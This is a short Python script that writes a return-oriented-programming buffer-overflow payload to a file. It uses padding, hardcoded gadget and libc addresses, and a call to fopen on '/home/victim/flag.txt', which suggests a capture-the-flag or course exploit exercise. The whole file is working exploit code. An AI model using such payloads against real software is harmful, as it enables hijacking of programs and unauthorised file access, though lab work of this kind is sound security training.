import struct
flag = b'/home/victim/flag.txt\x00'
flag_ptr = 0xffffde7c #part of input string
r = b'r\x00'
r_ptr = 0xffffde92 #part of input string
fopen = 0xf7f18d00
f_ptr = 0x5655a160
trickme = 0x56556209
f2_ptr = 0x5655b6e0
rop_gadgets = {
        "pop_ret" : 0x56556383, #pop ebp; ret;
        "pop_pop_ret" : 0x56556382 #pop pop; ret;
        }

payload = ''
payload += "A" * (40)
payload += struct.pack("I", rop_gadgets["pop_ret"]) #pop ret
payload += struct.pack("I", f_ptr)
payload += struct.pack("I", fopen)
payload += struct.pack("I", rop_gadgets["pop_pop_ret"]) #pop pop
payload += struct.pack("I", flag_ptr)
payload += struct.pack("I", r_ptr)
payload += struct.pack("I", trickme)
payload += struct.pack("I", 0x42424242)
payload += struct.pack("I", f2_ptr)
payload += flag
payload += r

with open('exploit7-file', 'wb') as f:
    f.write(payload)
